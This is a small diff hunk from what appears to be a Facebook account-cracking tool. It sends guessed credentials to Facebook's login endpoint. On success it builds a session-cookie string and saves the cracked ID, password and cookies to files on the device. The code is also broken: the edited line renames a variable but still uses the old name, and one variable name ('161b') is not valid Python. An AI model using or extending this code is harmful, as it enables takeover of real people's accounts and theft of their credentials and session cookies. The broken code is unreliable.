@@ -252,7 +252,7 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);161b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={161b};{ckkk}"
+                    check = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);161b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={161b};{ckkk}"
                     print(f"\r{R} [161-OK] {sid} | {ps} {S}")
                     oks.append(sid)
                     open('/sdcard/161_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/161_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
